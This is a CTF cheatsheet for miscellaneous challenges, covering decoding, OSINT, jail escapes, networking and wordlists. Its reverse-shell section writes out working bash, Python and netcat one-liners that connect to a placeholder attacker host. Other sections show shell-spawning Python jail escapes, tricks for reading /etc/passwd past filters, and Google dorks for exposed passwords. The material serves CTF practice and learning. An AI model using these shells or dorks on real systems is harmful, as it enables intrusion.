# Miscellaneous CTF Cheatsheet

## First Things to Try (Unknown Challenge)

```bash
# Identify what you have
file *
ls -la
cat README* description* 2>/dev/null

# Check file types
for f in *; do echo "=== $f ==="; file "$f"; done

# Look for obvious flags
grep -r "flag{" . 2>/dev/null
grep -r "CTF{" . 2>/dev/null
strings * 2>/dev/null | grep -iE "(flag|ctf)\{"
```

---

## Encoding/Decoding Swiss Army Knife

### Quick Decode Commands
```bash
# Base64
echo "dGVzdA==" | base64 -d

# Base32
echo "ORSXG5A=" | base32 -d

# Hex
echo "74657374" | xxd -r -p

# Binary
python3 -c "print(''.join(chr(int(b,2)) for b in '01110100 01100101'.split()))"

# ROT13
echo "grfg" | tr 'a-zA-Z' 'n-za-mN-ZA-M'

# URL decode
python3 -c "from urllib.parse import unquote; print(unquote('%74%65%73%74'))"

# HTML entities
python3 -c "import html; print(html.unescape('&#116;&#101;&#115;&#116;'))"

# Morse code
# Use: https://morsecode.world/international/translator.html

# Braille
# Use: https://www.dcode.fr/braille-alphabet
```

### Multi-Layer Decode
```bash
# CyberChef (best for chained encodings)
# https://gchq.github.io/CyberChef/

# Ciphey (auto-decode)
pip install ciphey
ciphey -t "ENCODED_STRING"
```

---

## Number Systems

### Conversions
```bash
# Decimal to Hex
printf '%x\n' 255

# Hex to Decimal
echo $((16#ff))

# Binary to Decimal
echo $((2#11111111))

# ASCII to Decimal
printf '%d\n' "'A"

# Decimal to ASCII
printf "\\$(printf '%03o' 65)"
```

### Python Conversions
```python
# Decimal to others
hex(255)         # '0xff'
bin(255)         # '0b11111111'
oct(255)         # '0o377'

# Others to decimal
int('ff', 16)    # 255
int('11111111', 2)  # 255
int('377', 8)    # 255

# Character conversions
ord('A')         # 65
chr(65)          # 'A'
```

---

## OSINT (Open Source Intelligence)

### Image Search
```bash
# Reverse image search
# - Google Images
# - TinEye
# - Yandex Images (best for faces)

# Metadata
exiftool image.jpg
# Check: GPS coordinates, camera model, software
```

### Username Search
```bash
# Tools
sherlock username
# https://namechk.com/
# https://whatsmyname.app/
```

### Domain/IP
```bash
whois domain.com
nslookup domain.com
dig domain.com
host domain.com

# Historical data
# https://web.archive.org/
# https://viewdns.info/
```

### Google Dorks
```
site:target.com filetype:pdf
site:target.com "password"
site:target.com ext:sql
inurl:admin site:target.com
"index of" site:target.com
```

---

## QR Codes & Barcodes

```bash
# Decode QR code
zbarimg image.png

# Generate QR code
qrencode -o output.png "text"

# If QR is damaged
# Try: https://merricx.github.io/qrazybox/

# Multiple QR codes in image
zbarimg --raw image.png
```

---

## Programming Challenges

### Common Languages
```bash
# Python
python3 solve.py

# JavaScript/Node
node solve.js

# Ruby
ruby solve.rb

# Perl
perl solve.pl
```

### Pwntools for I/O
```python
from pwn import *

# Local process
io = process(['./challenge'])

# Remote
io = remote('host', port)

# Interact
io.sendline(b'answer')
response = io.recvline()
io.interactive()
```

---

## Jail Escapes

### Python Jail Techniques
```python
# Access classes without builtins
().__class__.__bases__[0].__subclasses__()

# Find useful classes
[x for x in ().__class__.__bases__[0].__subclasses__() if 'os' in str(x)]

# Import via __import__
__import__('os').system('sh')

# Breakpoint escape (Python 3.7+)
breakpoint()
```

### Bash Jail
```bash
# If certain chars blocked
$'\x63\x61\x74' /etc/passwd   # cat
${PATH:0:1}etc${PATH:0:1}passwd   # /etc/passwd

# Read without cat
< /etc/passwd
head /etc/passwd
tail /etc/passwd
tac /etc/passwd
rev /etc/passwd | rev

# Glob patterns
/???/??t /etc/passwd
/???/b??/c?t /etc/passwd
```

---

## Networking

### Netcat
```bash
# Listen
nc -lvnp 4444

# Connect
nc host port

# File transfer
nc -lvnp 4444 > file          # Receiver
nc host 4444 < file           # Sender
```

### Port Scanning
```bash
# Quick scan
nmap -F host

# All ports
nmap -p- host

# Service detection
nmap -sV host

# Scripts
nmap -sC host
nmap --script=vuln host
```

### Reverse Shells
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python (see revshells.com for more)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

---

## Esoteric Languages

| Language | Identifier | Decoder |
|----------|------------|---------|
| Brainfuck | `+ - > < [ ] . ,` | copy.sh/brainfuck |
| Whitespace | Only spaces/tabs/newlines | vii5ard.github.io/whitespace |
| Piet | Colored pixel image | bertnase.de/npiet |
| Ook! | `Ook. Ook? Ook!` | dcode.fr/ook-language |
| Malbolge | Random-looking chars | lutter.cc/malbolge |

---

## Common File Signatures

| Hex Signature | File Type |
|---------------|-----------|
| `89 50 4E 47` | PNG |
| `FF D8 FF` | JPEG |
| `47 49 46 38` | GIF |
| `50 4B 03 04` | ZIP |
| `25 50 44 46` | PDF |
| `7F 45 4C 46` | ELF |
| `4D 5A` | EXE/DLL |
| `52 61 72 21` | RAR |
| `1F 8B` | GZIP |
| `42 5A 68` | BZ2 |

---

## Useful Websites

### Decoding/Crypto
- [CyberChef](https://gchq.github.io/CyberChef/) - Multi-tool
- [dCode](https://www.dcode.fr/) - Cipher solver
- [Ciphey](https://github.com/Ciphey/Ciphey) - Auto-decode
- [quipqiup](https://quipqiup.com/) - Substitution solver

### Binary
- [Dogbolt](https://dogbolt.org/) - Multi-decompiler
- [Compiler Explorer](https://godbolt.org/) - See assembly

### Web
- [RequestBin](https://requestbin.com/) - Capture requests
- [Webhook.site](https://webhook.site/) - Capture requests

### Hash Cracking
- [CrackStation](https://crackstation.net/)
- [hashes.com](https://hashes.com/)

### Forensics
- [AperiSolve](https://aperisolve.fr/) - Stego analysis
- [FotoForensics](https://fotoforensics.com/)

### Reverse Shells
- [revshells.com](https://revshells.com/) - Generator

---

## Quick Flag Formats

```bash
# Common patterns
flag{...}
CTF{...}
picoCTF{...}
HTB{...}
THM{...}
FLAG{...}

# Regex to find all
grep -rioE "(flag|ctf|pico|htb|thm)\{[^}]+\}" .
```

---

## Wordlists

```bash
# Common locations
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/

# Download rockyou
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# Download SecLists
git clone https://github.com/danielmiessler/SecLists.git
```
